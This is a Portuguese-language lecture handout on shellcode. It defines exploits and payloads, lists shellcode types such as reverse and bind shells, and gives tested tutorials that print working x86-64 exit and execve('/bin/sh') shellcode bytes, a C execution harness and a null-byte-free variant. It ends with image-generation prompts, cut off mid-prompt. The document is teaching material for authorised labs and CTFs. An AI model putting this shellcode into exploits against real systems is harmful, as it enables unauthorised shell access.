# Aula 9 — Introdução a Shellcode

> Ambiente prático disponível: **Bellard (JSLinux)** e **pwn.college**.

---

# PARTE 1 — CONCEITOS E CONTEÚDO

## 1. Recapitulando: o que é um Buffer

Antes de falar de shellcode, é preciso deixar cravado o que é um **buffer**, porque tudo que vem depois depende disso.

**Buffer** é um espaço de memória **reservado com um tamanho fixo**, destinado a guardar dados temporariamente — geralmente entrada de usuário, dados lidos de um arquivo, ou dados recebidos pela rede. No nosso código já testado em aula:

```c
char buffer[16];
read(0, buffer, 100);
```

`buffer` é literalmente isso: 16 bytes reservados na pilha. O problema não está em ele existir — está no `read` seguinte, que aceita ler **até 100 bytes**, mesmo o espaço reservado sendo de só 16.

## 2. Recapitulando: o que é Buffer Overflow

**Buffer overflow** é o que acontece quando a quantidade de dados escrita **ultrapassa** o tamanho do buffer, e esses dados "vazam" para a memória vizinha — sem que o programa perceba ou impeça isso.

Já testamos isso de verdade em aula: 24 bytes de enchimento + 8 bytes de endereço sobrescreveram o `RBP` salvo e o endereço de retorno, fazendo o `RET` pular para uma função (`funcao_secreta`) que nenhuma parte do código normal chamava.

**O ponto que fecha o ciclo para hoje**: naquele exemplo, o atacante tinha sorte — já existia, pronta, dentro do binário, uma função útil pra pular. **Na vida real, isso quase nunca acontece.** O atacante normalmente não tem uma função pronta esperando por ele. Ele precisa fazer o programa executar um código que **ele mesmo escreveu**. É exatamente esse problema que o shellcode resolve.

## 3. O que é Shellcode (definição completa, sem vaguidade)

**Shellcode** é uma sequência de bytes de **código de máquina puro** — não é um arquivo executável completo, não tem cabeçalho, não depende de bibliotecas externas — escrita para ser copiada para dentro de um espaço de memória do programa-alvo (como o buffer vulnerável) e **executada diretamente a partir dali**.

### Como o shellcode é criado e "injetado", passo a passo real

Isso é o que estava vago antes — aqui está o processo concreto, sem pular etapas:

1. **Escreve-se a lógica desejada em Assembly** (não em C, não em Python — porque shellcode precisa ser só bytes de instrução de máquina, sem nada em volta). Por exemplo: um código Assembly que chama a syscall `execve("/bin/sh")`.

2. **Monta-se esse Assembly** com um montador (`nasm`, por exemplo), gerando um arquivo objeto.

3. **Extraem-se só os bytes de instrução (opcodes)** desse arquivo objeto — descartando cabeçalho ELF, símbolos, seções, tudo que não seja instrução pura. O resultado final é uma sequência crua de bytes, tipo:
   ```
   \x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68...
   ```
   Isso, e só isso, é o "shellcode" propriamente dito — nenhum arquivo, nenhum programa, só bytes.

4. **Esses bytes são colocados dentro do payload de um exploit** — no nosso caso, no lugar onde antes colocávamos `b'A' * 24` (bytes de enchimento sem função nenhuma), agora colocamos os bytes reais do shellcode.

5. **O endereço de retorno, sobrescrito pelo buffer overflow, é apontado para dentro do próprio buffer** — ou seja, para o começo dos bytes do shellcode que acabaram de ser escritos ali. Quando o `RET` executa, ele não pula para uma função existente: ele pula para dentro do próprio buffer, onde o processador vai interpretar aqueles bytes como instruções e **executá-las**.

Ou seja, a resposta direta pra pergunta "se gera código em outra linguagem e injeta os bytes, ou injeta direto": **os bytes são gerados a partir de Assembly montado (não de C, não de linguagem de alto nível), e depois colocados diretamente dentro dos mesmos dados que o buffer overflow já escreve na memória** — não existe um passo separado de "instalação"; a injeção **é** a própria escrita do buffer overflow, só que agora carregando instruções de verdade em vez de lixo.

## 4. O que é Payload

**Payload**, no contexto de exploração de vulnerabilidades, é um termo mais **genérico** que shellcode: é **qualquer dado entregue como consequência de uma exploração bem-sucedida**, com a intenção de causar um efeito específico no sistema-alvo.

Shellcode é **um tipo** de payload — especificamente, um payload que é **código executável**. Mas nem todo payload precisa ser código executável: um payload também pode ser, por exemplo, só um valor numérico que desativa uma checagem de segurança, ou dados que corrompem uma estrutura de controle sem conter instrução nenhuma.

**Resumo da relação**: todo shellcode é um payload; nem todo payload é um shellcode.

## 5. O que é Exploit

**Exploit** é a técnica (ou o programa) que **explora uma vulnerabilidade específica** para conseguir entregar e executar um payload. É o "veículo" — o buffer overflow que já construímos e testamos em aula **é o exploit**; os 24 bytes de enchimento e o endereço de retorno sobrescrito são o **mecanismo de entrega**; e o que ele entrega (seja o pulo pra `funcao_secreta`, seja um shellcode de verdade) é o **payload**.

## 6. A relação entre os três conceitos, junta

```
EXPLOIT (o mecanismo)
   |
   | explora a vulnerabilidade e entrega...
   v
PAYLOAD (o que é entregue)
   |
   | pode ser, especificamente...
   v
SHELLCODE (um payload que é código executável)
```

No nosso exemplo já testado: o **exploit** é o buffer overflow (24 bytes + endereço sobrescrito); o **payload**, naquele caso, era só um endereço apontando pra `funcao_secreta` — não era shellcode, porque não era código sendo injetado, era só um redirecionamento pra código que já existia. Se, em vez disso, colocássemos bytes de instrução de máquina reais dentro do buffer e apontássemos o retorno pra lá, aí sim o payload passaria a ser, especificamente, um **shellcode**.

## 7. Por que isso importa em Cybersecurity

**Lado ataque**: shellcode é o "último passo" de uma exploração — depois de conseguir desviar o fluxo de execução (via buffer overflow ou outra técnica), é o shellcode que determina **o que de fato acontece** no sistema comprometido: abrir um shell, criar um usuário, baixar mais malware, etc.

**Lado defesa**: entender shellcode é pré-requisito para: escrever assinaturas de detecção de antivírus/EDR, entender por que proteções como NX/DEP existem (elas bloqueiam justamente a execução de bytes dentro de regiões de dados, como o buffer), e interpretar relatórios de análise de malware, que frequentemente incluem o shellcode extraído como evidência.

**Formação profissional**: certificações de segurança ofensiva (como OSCP) e praticamente toda competição de CTF na categoria "pwn"/exploração binária tratam a escrita e o entendimento de shellcode como habilidade central, não opcional.

## 8. Variações de Shellcode por objetivo (lista completa, sem "etc")

- **Spawn shell local** — o shellcode chama uma syscall do tipo `execve`, substituindo o processo atual por um shell interativo (`/bin/sh` ou `/bin/bash`), dando ao atacante controle de linha de comando na mesma máquina onde o exploit rodou.
- **Reverse shell** — o shellcode abre uma conexão de rede **saindo** da máquina vulnerável **em direção** a um endereço controlado pelo atacante, e entrega um shell através dessa conexão. Usado quando a máquina-alvo está atrás de um firewall que bloqueia conexões de entrada, mas permite saída.
- **Bind shell** — o shellcode abre uma porta de rede **na própria máquina vulnerável** e fica esperando o atacante se conectar a ela. Usado quando o atacante consegue alcançar diretamente a máquina-alvo pela rede.
- **Download and execute (stager)** — um shellcode pequeno, cuja única função é baixar um payload maior de algum lugar da rede (um servidor controlado pelo atacante) e executá-lo. Usado quando o espaço disponível no buffer vulnerável é pequeno demais para um shellcode completo.
- **Add user / criação de usuário privilegiado** — o shellcode cria uma nova conta de usuário no sistema, geralmente com privilégios administrativos, garantindo acesso persistente mesmo depois que a vulnerabilidade original for corrigida.
- **Desativação de defesas** — o shellcode desliga mecanismos de proteção do próprio sistema (firewall local, antivírus, logging), preparando terreno para ações seguintes.
- **Injeção em processo (process injection)** — o shellcode não executa isoladamente; ele se insere dentro de um processo legítimo já em execução, escondendo sua atividade dentro de um programa que parece confiável.
- **Escalonamento de privilégio (privilege escalation)** — o shellcode explora uma segunda vulnerabilidade, específica de escalonamento, para elevar o nível de acesso do atacante (de usuário comum para administrador/root), a partir de um ponto de entrada que só deu acesso limitado.
- **Execução de comando único** — em vez de abrir um shell interativo completo, o shellcode executa só um comando específico e determinado (por exemplo, apagar um arquivo, ou modificar uma configuração), sem deixar um canal interativo aberto.

## 9. Variações de Shellcode por técnica de entrega

- **Stageless** — o shellcode completo, com toda a lógica necessária, cabe inteiro dentro do espaço disponível no buffer vulnerável e é entregue de uma vez só.
- **Staged** — o espaço disponível é pequeno demais para o shellcode completo. Primeiro entra um shellcode minúsculo (o "stage 1"), cuja única função é buscar o restante do payload (via rede, geralmente) e executá-lo — esse segundo estágio é que contém a lógica completa.

## 10. Variações de Shellcode por restrição de conteúdo (bad characters)

Dependendo de como os dados chegam até o programa vulnerável, certos valores de byte podem "quebrar" o ataque antes mesmo do shellcode rodar. Por isso existem variações construídas especificamente para contornar essas restrições:

- **Shellcode normal (sem restrição)** — usa qualquer valor de byte, de `0x00` a `0xFF`, livremente.
- **Shellcode sem bytes nulos (null-free)** — evita completamente o byte `0x00`. Necessário sempre que o vetor de entrada for baseado em funções de string em C (como `strcpy`), que interpretam `0x00` como fim da string e cortam tudo que vem depois — exatamente o mesmo problema de truncamento que vimos, nessa mesma aula, ao tentar passar um endereço via `argv`.
- **Shellcode alfanumérico** — construído usando **só** bytes que correspondem a caracteres alfanuméricos imprimíveis (letras e números do ASCII). Necessário quando o vetor de entrada passa por filtros que só aceitam texto "normal", rejeitando qualquer byte fora dessa faixa.
- **Shellcode codificado (encoded)** — o shellcode real é transformado (por exemplo, com uma operação `XOR` repetida) para não conter nenhum dos bytes proibidos, e é precedido por um pequeno **decodificador**, que roda primeiro, desfaz essa transformação em tempo de execução, e só então entrega o controle para o shellcode original já decodificado.

## 11. Position-Independent Code (PIC) — por que isso é obrigatório em shellcode

Um shellcode quase nunca sabe, de antemão, em qual endereço exato de memória ele vai parar quando for injetado — isso muda a cada execução do programa-alvo, especialmente com proteções como ASLR ativas. Por isso, shellcode **não pode conter endereços absolutos fixos** dentro do seu próprio código (por exemplo, não pode simplesmente fazer `jmp 0x604020` esperando que aquele endereço específico sempre exista). Em vez disso, técnicas como **JMP-CALL-POP** são usadas para o próprio shellcode **descobrir**, em tempo de execução, o endereço de memória onde ele mesmo está rodando, e trabalhar a partir dali — tornando-se **independente de posição**, ou seja, funcional não importa em qual endereço ele tenha sido colocado.

## 12. Boas práticas de construção

- Evitar bytes nulos e outros "bad characters" relevantes para o vetor de entrada específico sendo usado.
- Garantir que o shellcode seja position-independent.
- Minimizar o tamanho total em bytes, já que o espaço disponível no buffer vulnerável costuma ser limitado.
- Testar sempre em ambiente isolado e controlado (máquina virtual, container, ou sandbox como o Bellard/pwn.college) — nunca em sistema de terceiros sem autorização explícita.

## 13. Práticas comuns de construção (processo real, passo a passo)

1. Escrever a lógica desejada primeiro em Assembly legível, com rótulos e comentários.
2. Montar esse código e extrair só os bytes de instrução puros (sem cabeçalho, sem seções).
3. Testar esses bytes dentro de um **harness** — um pequeno programa auxiliar (em C, por exemplo) que copia os bytes do shellcode para um espaço de memória executável e desvia a execução para lá — antes de usar o shellcode dentro de um exploit real. Isso isola erros do shellcode em si, sem depender do exploit inteiro funcionar.
4. Só depois de confirmado funcionando isoladamente no harness, o shellcode é incorporado ao payload do exploit de verdade.

## 14. Quando usar / contexto de aplicação

Pentest autorizado por contrato, pesquisa de vulnerabilidade responsável, desenvolvimento de exploit em ambiente controlado (como os dojos do pwn.college), e competições de CTF. A fronteira entre isso e crime de computador é definida por **autorização explícita** do dono do sistema — sem ela, qualquer uso deixa de ser pesquisa de segurança e passa a ser ilegal.

## 15. Ambiente prático desta aula

**Bellard (JSLinux)**: útil para demonstração rápida, ao vivo, sem nenhum setup — abre direto no navegador, já com um Linux (Alpine) funcional, bom para mostrar o harness rodando em tempo real durante a aula.

**pwn.college**: ambiente estruturado, com exercícios prontos e correção automática por flag — melhor indicado para os alunos praticarem depois da aula, de forma individual e autoguiada.

---

# PARTE 2 — TUTORIAL PRÁTICO (testado e validado, comandos e saídas reais)

## Tutorial 1 — Shellcode mais simples possível: `exit(42)`

### Passo 1: escrever o Assembly

```asm
BITS 64
    mov rax, 60      ; syscall exit
    mov rdi, 42      ; código de saída = 42
    syscall
```

### Passo 2: montar direto como binário puro (sem cabeçalho ELF)

**Antes de rodar o comando, o que é "cabeçalho ELF", concretamente?**

Todo executável Linux normal (como os que a gente já montou nas aulas anteriores, com `nasm -f elf64` + `ld`) carrega, no começo do arquivo, um bloco de metadados chamado **cabeçalho ELF**. Ele não é código — é uma "ficha de identificação" do arquivo, com campos como:
- Um "número mágico" (bytes fixos no início, que dizem "isto é um ELF") 
- Se é de 32 ou 64 bits
- **O endereço onde a execução deve começar** (o "entry point")
- Onde ficam as seções (`.text`, `.data`, etc.) dentro do arquivo
- Tabela de símbolos (nomes como `_start`, `mensagem`, que usamos nas aulas de GDB)

Um shellcode **não pode ter nada disso**. Ele vai ser colocado dentro de um buffer de memória, no meio de um programa que já está rodando — não existe "carregador de ELF" ali pra ler esse cabeçalho e descobrir onde começar. O processador só vai começar a executar **o primeiro byte** que a execução for desviada pra lá. Por isso, shellcode tem que ser **só as instruções, sem absolutamente nenhum metadado em volta**.

```bash
nasm -f bin exit42.asm -o exit42.bin
```

O `-f bin` é o pulo do gato aqui: em vez de gerar um objeto ELF (com todo aquele cabeçalho e metadado descritos acima), o NASM gera **só os bytes de instrução**, exatamente como shellcode precisa ser.

### Passo 3: ver os bytes reais gerados

**O que é o comando `od`?**

`od` significa *octal dump* — historicamente ele mostrava os bytes de um arquivo em octal (base 8), mas hoje é usado com flags pra mostrar em outros formatos também. É uma ferramenta simples que faz uma coisa só: **abre um arquivo e mostra o valor bruto de cada byte dele**, sem tentar interpretar como texto, como imagem, ou qualquer outra coisa — é uma leitura "crua" do conteúdo.

As flags que estamos usando:
- `-A n` → não mostra a coluna de endereço/offset no início de cada linha (deixa a saída mais limpa)
- `-t x1` → mostra cada byte em formato hexadecimal (`x`), um byte por vez (`1`)

```bash
od -An -tx1 exit42.bin
```

Saída real:
```
b8 3c 00 00 00 bf 2a 00 00 00 0f 05
```

12 bytes. É isso, e só isso, que é o "shellcode" — nenhum arquivo executável, nenhum cabeçalho, só esses 12 bytes.

### A ponte que precisa ficar clara: por que 12 bytes causam um estrago desproporcional

Isso parece contraintuitivo à primeira vista: como uma coisa tão pequena (12 bytes — menor que essa própria frase) pode comprometer um sistema inteiro? A resposta não está no **tamanho** do shellcode — está em **onde** e **com que poder** ele executa:

1. **Ele roda com os mesmos privilégios do programa que foi comprometido.** Se o programa vulnerável está rodando como `root` (como no nosso teste do harness — reparem que o `whoami` retornou `root`), o shellcode injetado também executa como `root`. O tamanho do código não limita o nível de acesso que ele tem — quem limita isso é o processo hospedeiro, e o shellcode "herda" esse poder inteiro.

2. **O processador não distingue "código pequeno" de "código pouco perigoso".** Um processador executa instrução por instrução, não julga o tamanho do programa. Os mesmos 12 bytes que fazem `exit(42)` poderiam, no mesmo espaço, chamar `execve`, abrir uma conexão de rede, ou apagar um arquivo — o **tamanho em bytes não tem relação nenhuma** com a gravidade do que a instrução pode fazer. Uma única instrução `syscall`, de 2 bytes, é capaz de disparar qualquer uma das 300+ chamadas de sistema que o Linux oferece.

3. **O verdadeiro "tamanho" do ataque é o efeito, não o código.** É como comparar o tamanho de uma chave com o tamanho da porta que ela abre — a chave pode ser pequena, mas dá acesso a uma casa inteira. Da mesma forma, esses 12 bytes não precisam ser grandes, porque a função deles não é "fazer muita coisa sozinhos" — é **abrir a porta** para que qualquer coisa aconteça a partir dali, com o poder completo do processo comprometido.

### Passo 3-alternativo: o outro jeito de extrair (quando você já montou como ELF normal)

Às vezes você já tem o código montado do jeito "normal" (`-f elf64`), com rótulos e seções, e quer extrair os bytes de lá — sem precisar reescrever tudo em formato `bin`. Dá pra fazer assim:

```bash
nasm -f elf64 exit42_elf.asm -o exit42_elf.o
objdump -d -M intel exit42_elf.o
```

Saída real:
```
0000000000000000 <_start>:
   0:   b8 3c 00 00 00        mov    eax,0x3c
   5:   bf 2a 00 00 00        mov    edi,0x2a
   a:   0f 05                  syscall
```

Ou, pra extrair só os bytes puros da seção `.text`, sem o texto do disassemble:

```bash
objcopy -O binary --only-section=.text exit42_elf.o exit42_from_elf.bin
od -An -tx1 exit42_from_elf.bin
```

Saída real (**idêntica** ao método anterior):
```
b8 3c 00 00 00 bf 2a 00 00 00 0f 05
```

Os dois caminhos chegam exatamente no mesmo lugar — use o que for mais conveniente pro seu fluxo de trabalho.

### Passo 4: construir o harness em C, pra testar se o shellcode funciona de verdade

**O que é um "harness"?**

*Harness* (literalmente "arreio", "equipamento de segurança") é um termo emprestado de teste de software: é um **programa auxiliar, escrito só pra criar as condições necessárias pra testar outra coisa** — nesse caso, testar se o shellcode funciona, **sem precisar de um exploit completo funcionando**. O harness não é o ataque, não é o shellcode, não é o programa vulnerável — ele é uma "bancada de testes" que você mesmo controla, pra validar o shellcode isoladamente antes de usá-lo de verdade.

Por que isso importa na prática: se você colocar um shellcode com erro direto dentro de um exploit complexo (envolvendo buffer overflow, cálculo de offset, etc.) e nada funcionar, você não sabe se o erro está no shellcode ou no exploit. O harness elimina essa dúvida — ele testa **só** o shellcode, em isolamento.

```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
    0xb8, 0x3c, 0x00, 0x00, 0x00,   // mov eax, 0x3c (60 = exit)
    0xbf, 0x2a, 0x00, 0x00, 0x00,   // mov edi, 0x2a (42)
    0x0f, 0x05                      // syscall
};

int main() {
    printf("Tamanho do shellcode: %zu bytes\n", sizeof(shellcode));

    void *mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(mem, shellcode, sizeof(shellcode));
    printf("Shellcode copiado para memoria executavel em %p\n", mem);
    printf("Pulando para dentro do shellcode agora...\n");

    void (*func)() = (void (*)())mem;
    func();

    printf("Isso aqui nao deveria aparecer!\n");
    return 0;
}
```

### Explicando o harness, linha por linha — lógica de programação E significado como exploit

| Linha | O que faz (lógica C) | O que representa (perspectiva de exploit) |
|---|---|---|
| `unsigned char shellcode[] = {...}` | Um array de bytes, um valor por posição | São os 12 bytes que extraímos no Passo 3 — em um ataque real, esses mesmos bytes estariam dentro do buffer vulnerável, escritos ali por um buffer overflow, não numa variável C declarada assim |
| `mmap(NULL, ..., PROT_READ \| PROT_WRITE \| PROT_EXEC, ...)` | Pede ao sistema operacional um novo pedaço de memória, marcado como legível, gravável **e executável** | Isso é o harness fazendo, de propósito e às claras, o que a proteção **NX/DEP** (mencionada nas aulas anteriores) existe pra **impedir**: memória normal de dados (como a pilha, onde fica um buffer) não deveria poder ser executada. Aqui liberamos isso manualmente só para fins didáticos — um ataque real precisa **contornar** essa proteção (é aí que entram técnicas como ROP, fora do escopo de hoje) |
| `memcpy(mem, shellcode, sizeof(shellcode))` | Copia os bytes do array para dentro da memória recém-alocada | Equivale exatamente ao momento em que o buffer overflow escreve o shellcode dentro do buffer vulnerável — é o "Passo 4" da Seção 3, a própria injeção |
| `void (*func)() = (void (*)())mem;` | Cria um ponteiro de função, fingindo que o endereço `mem` é o início de uma função C válida | É um truque de linguagem pra conseguir "pular" pra um endereço de memória qualquer — no exploit real, isso é literalmente o que o `RET` faz quando o endereço de retorno foi sobrescrito para apontar pro buffer |
| `func();` | Chama essa "função" — ou seja, desvia a execução pro endereço `mem` | Este é o instante exato equivalente ao `RET` executar, no nosso exemplo de buffer overflow: o fluxo do programa sai do código original e entra dentro dos bytes que nós escrevemos |
| `printf("Isso aqui nao deveria aparecer!\n");` | Uma linha de código que só rodaria se `func()` retornasse normalmente | Serve como **prova**: se essa linha aparecer na tela, o shellcode falhou (não tomou conta da execução). Se ela **não** aparecer, é evidência de que o shellcode assumiu o controle e nunca devolveu |

### As três conexões que precisam ficar explícitas, sempre

Todo exemplo daqui pra frente vai trazer essas três respostas separadas — são coisas diferentes, e misturá-las é o que gerava a confusão:

| Pergunta | Resposta para este exemplo (`exit(42)`) |
|---|---|
| **O que foi explorado?** (o mecanismo/vulnerabilidade que entregou o shellcode) | **Nenhuma vulnerabilidade real aqui.** O harness simula manualmente a entrega, com `mmap` + `memcpy` + ponteiro de função — não existe buffer overflow, nem nenhuma outra falha sendo explorada nesse tutorial. É um ambiente de teste controlado, não um ataque. |
| **Qual problema (consequência técnica) foi gerado?** | **Desvio de fluxo de execução controlado pelo atacante** — o processo parou de seguir a lógica original do programa C e passou a executar instruções escolhidas por quem escreveu o shellcode. Não houve corrupção de memória aqui (o harness não sobrescreveu nada indevidamente — ele alocou espaço próprio e pulou pra lá de propósito). |
| **Qual o tipo de payload?** (da lista da Seção 8) | Nenhum dos nove objetivos listados — é o **shellcode de prova de conceito mínima**: o menor código possível só pra confirmar que todo o mecanismo de injeção e execução está funcionando, antes de partir pra um shellcode com objetivo real de ataque (como o Tutorial 2, a seguir). |

### Passo 5: compilar e rodar

```bash
gcc harness.c -o harness
./harness
echo "Exit code: $?"
```

Saída real:
```
Tamanho do shellcode: 12 bytes
Shellcode copiado para memoria executavel em 0x...
Pulando para dentro do shellcode agora...
Exit code: 42
```

**Confirmação de que funcionou de verdade**: a linha `"Isso aqui nao deveria aparecer!"` **nunca é impressa**, e o código de saída do programa é `42` — exatamente o valor que o shellcode, não o `return 0` do C, definiu. Isso prova que o fluxo de execução realmente saiu do C e foi para dentro do shellcode.

---

## Tutorial 2 — Shellcode clássico: `execve("/bin/sh")` (spawn shell local)

### As três conexões, para este exemplo

| Pergunta | Resposta para este exemplo (`execve("/bin/sh")`) |
|---|---|
| **O que foi explorado?** (o mecanismo/vulnerabilidade que entregou o shellcode) | **Nenhuma vulnerabilidade real neste harness** — de novo, é `mmap` + `memcpy` + ponteiro de função, entrega manual e controlada, sem exploração de falha nenhuma. **Mas aqui está a ponte importante**: se este mesmo shellcode fosse entregue por um **buffer overflow real** — exatamente como testamos na Aula 8, com o código `vulneravel3.c` — **sim, haveria corrupção de memória de verdade**. O `RBP` salvo e o endereço de retorno seriam sobrescritos exatamente como naquele teste (24 bytes de enchimento + 8 bytes de endereço); a única mudança seria: em vez do endereço sobrescrito apontar pra `funcao_secreta` (uma função que já existia no binário), ele apontaria pro **início destes 30 bytes de shellcode**, colocados dentro do próprio buffer vulnerável. |
| **Qual problema (consequência técnica) foi gerado?** | **Substituição completa do processo por um shell interativo.** Isso é uma consequência mais severa que o Tutorial 1: `execve` não só desvia o fluxo — ele **apaga a imagem do processo atual da memória e a substitui inteiramente** por `/bin/sh`. Não sobra rastro do programa original rodando; o que continua existindo, com o mesmo PID, é agora um shell completo, com os mesmos privilégios que o processo vulnerável tinha (por isso o `whoami` retornou `root` no nosso teste). |
| **Qual o tipo de payload?** (da lista da Seção 8) | **"Spawn shell local"** — o primeiro item da lista. Diferente do Tutorial 1 (sem objetivo de ataque nenhum), este código tem finalidade ofensiva real e nomeada: entregar ao atacante um shell interativo, na própria máquina onde o exploit rodou. |

### Assembly

```asm
BITS 64
    xor rdx, rdx              ; rdx = NULL (envp)
    push rdx                   ; empilha NULL (terminador da string)
    mov rax, 0x68732f2f6e69622f  ; "/bin//sh" em little-endian
    push rax
    mov rdi, rsp                ; rdi = ponteiro para "/bin//sh"
    push rdx                    ; argv[1] = NULL
    push rdi                    ; argv[0] = ponteiro pra string
    mov rsi, rsp                 ; rsi = ponteiro para argv[]
    mov rax, 59                   ; syscall execve
    syscall
```

### Montar e extrair

```bash
nasm -f bin shell.asm -o shell.bin
od -An -tx1 shell.bin
```

Saída real:
```
48 31 d2 52 48 b8 2f 62 69 6e 2f 2f 73 68 50 48
89 e7 52 57 48 89 e6 b8 3b 00 00 00 0f 05
```
30 bytes.

### Explicando a lógica do Assembly — o que esse código está construindo

Diferente do Tutorial 1 (que só chamava uma syscall direto), este código **monta uma estrutura de dados na pilha** antes de chamar `execve`, porque essa syscall exige três argumentos: o caminho do programa a rodar, um array de argumentos (`argv`), e um array de variáveis de ambiente (`envp`).

| Instrução | O que faz |
|---|---|
| `xor rdx, rdx` | Zera o registrador RDX — ele vai virar o terceiro argumento da syscall (`envp = NULL`, ou seja, "sem variáveis de ambiente") |
| `push rdx` | Empilha esse zero — vai servir de **terminador** (o "fim da lista") pro array de argumentos que estamos montando a seguir |
| `mov rax, 0x68732f2f6e69622f` | Carrega em RAX os 8 bytes que, lidos como texto, formam `"/bin//sh"` (a barra dupla é só para completar 8 bytes exatos, sem afetar o caminho) |
| `push rax` | Empilha essa string — agora ela existe fisicamente na memória, no topo da pilha |
| `mov rdi, rsp` | RDI passa a apontar para o endereço onde a string `"/bin//sh"` acabou de ser empilhada — esse é o **primeiro argumento** de `execve` (o caminho do programa) |
| `push rdx` / `push rdi` | Monta o array `argv[]` diretamente na pilha: primeiro empilha o terminador `NULL` (`argv[1]`), depois o ponteiro pra string (`argv[0]`) — lembrando que a pilha cresce pra baixo, então o que foi empilhado por último fica "em cima" |
| `mov rsi, rsp` | RSI aponta pro topo da pilha agora — que é exatamente o começo do array `argv[]` que acabamos de montar. Esse é o **segundo argumento** de `execve` |
| `mov rax, 59` | 59 é o número da syscall `execve` no Linux x86-64 |
| `syscall` | Executa `execve("/bin//sh", argv, NULL)` — o processo atual é **substituído** por um shell interativo |

### ⚠️ Achado real, ligado à Seção 10: esse shellcode TEM bytes nulos — prova concreta do problema

Repare nos `00 00 00` perto do fim — vêm da instrução `mov rax, 59`, que o processador codifica com zeros de preenchimento.

**O que isso representa, na prática, não só em teoria**: testei o efeito real de injetar esse shellcode através de uma função de string em C (`strcpy`), simulando exatamente o tipo de vulnerabilidade que vimos nas aulas de buffer overflow. Código completo do teste:

```c
#include <stdio.h>
#include <string.h>

unsigned char shellcode_com_nulos[] = {
    0x48, 0x31, 0xd2, 0x52, 0x48, 0xb8, 0x2f, 0x62,
    0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x50, 0x48,
    0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0xb8,
    0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05
};

int main() {
    char buffer_destino[100];
    printf("Tamanho REAL do shellcode: %zu bytes\n", sizeof(shellcode_com_nulos));

    // Simulando o que aconteceria se um programa vulneravel usasse strcpy
    // pra copiar esse shellcode pra dentro de um buffer
    strcpy(buffer_destino, (char *)shellcode_com_nulos);

    printf("Tamanho copiado por strcpy: %zu bytes\n", strlen(buffer_destino));
    printf("O restante do shellcode foi SILENCIOSAMENTE CORTADO.\n");
    return 0;
}
```

Resultado real:
```
Tamanho REAL do shellcode: 30 bytes
Tamanho copiado por strcpy: 25 bytes
```

**Isso é grave, e o motivo é específico**: `strcpy` para de copiar assim que encontra o primeiro byte `0x00`, porque em C isso significa "fim da string". Só que os 5 bytes que ficaram de fora não são "só mais um pedaço qualquer" — são exatamente os 3 zeros de preenchimento **mais a própria instrução `syscall` final** (`0f 05`). Ou seja: o shellcode não fica "um pouco menor" — ele perde a instrução que de fato dispara a chamada de sistema. Um shellcode truncado assim **nunca vai abrir o shell**, porque a parte que faltou é justamente a que executa a ação. Essa é a razão concreta, não abstrata, de por que null-free importa.

### Testando este (com bytes nulos) no harness — funciona, porque aqui copiamos os bytes direto, sem passar por string

```bash
gcc harness_shell.c -o harness_shell -z execstack
printf 'whoami\nexit\n' | ./harness_shell
```

Saída real:
```
root
```

O shell abriu de verdade, executou `whoami` (mostrando o usuário real do sistema) e depois `exit`. **Confirmado, funcionando** — porque aqui usamos `memcpy` (que copia um número exato de bytes, sem se importar com `0x00`), não `strcpy`. É o mesmo shellcode do parágrafo anterior, mas entregue por um caminho diferente, que não trunca.

### Corrigindo para null-free

Troca só a forma de zerar RAX antes do número da syscall — em vez de `mov rax, 59` (que gera zeros de preenchimento), usa `xor rax, rax` (que não tem esse problema) seguido de `mov al, 59` (só o byte baixo, sem preenchimento):

```asm
    ...
    mov rsi, rsp
    xor rax, rax        ; zera rax SEM gerar byte 0x00 literal
    mov al, 59            ; só o byte baixo — sem zero-padding
    syscall
```

### Confirmando que agora é null-free de verdade

```bash
nasm -f bin shell_nullfree.asm -o shell_nullfree.bin
python3 -c "
data = open('shell_nullfree.bin','rb').read()
print('Tem byte nulo?', b'\x00' in data)
print('Tamanho:', len(data), 'bytes')
"
```

Saída real:
```
Tem byte nulo? False
Tamanho: 30 bytes
```

### Testando a versão null-free no harness

```bash
gcc harness_nullfree.c -o harness_nullfree -z execstack
printf 'echo funcionou sem bytes nulos\nexit\n' | ./harness_nullfree
```

Saída real:
```
funcionou sem bytes nulos
```

**Confirmado**: mesmo tamanho (30 bytes), mesmo comportamento, zero bytes nulos — pronto pra ser usado atrás de uma função de string em C, sem risco de truncamento.

---

## Sobre usar o pwn.college para isso

Sim, faz sentido, e resolve exatamente o problema que você apontou (plataforma feita pra isso, ambiente controlado, sem gerar problema).

**Como estruturar**: seguindo o mesmo modelo de dojo privado que já construímos antes nessa conversa (lembra do desafio `hello_world` em Assembly?), dá pra criar **um desafio por tipo de shellcode** da lista da Seção 8:

- Desafio 1: `exit(42)` — o "hello world" de shellcode, exatamente o Tutorial 1 acima
- Desafio 2: `execve("/bin/sh")` — o Tutorial 2 acima, pedindo pro aluno chegar no shell
- Desafio 3: versão null-free do mesmo — o aluno recebe um "harness" que só aceita shellcode sem bytes nulos, e precisa adaptar
- Desafio 4 em diante: um desafio por variação restante da Seção 8 (reverse shell, bind shell, download-and-execute, etc.), cada um com seu próprio harness/checker, seguindo exatamente o padrão `/challenge/check` que já criamos juntos

Cada desafio usa o mesmo mecanismo de correção automática por flag que já validamos — o aluno escreve o shellcode, roda um script de checagem (que copia os bytes pro harness, executa, confirma o comportamento esperado), e a flag é liberada.

---

# PARTE 3 — PROMPTS PARA O GEMINI (imagens ilustrativas, não diagramas)

> Trocado conforme pedido: agora são **imagens representativas de cena**, não diagramas técnicos com caixas e setas. Sequência de 4, contando visualmente a jornada de um shellcode, do código até a execução. Em português, nível de detalhe equilibrado.

### Imagem 1 — Escrevendo o código Assembly

```
Uma imagem de uma tela de computador em close-up, mostrando um editor de 
código com syntax highlighting colorido, exibindo um pequeno trecho de código 
Assembly de baixo nível (instruções curtas, registradores, comentários com 
ponto e vírgula). Ambiente escuro, tipo terminal de programador à noite, luz 
azulada da tela iluminando o teclado. Atmosfera de trabalho técnico, foco na 
tela, sem rosto de pessoa visível, só as mãos digitando no canto inferior.
```

### Imagem 2 — O código sendo transformado em bytes

```
Uma imagem estilizada mostrando uma transição visual: de um lado, blocos de 
texto de código-fonte; do outro lado, uma sequência de números hexadecimais 
brilhantes fluindo como um rio de dados, saindo do código e se transformando 
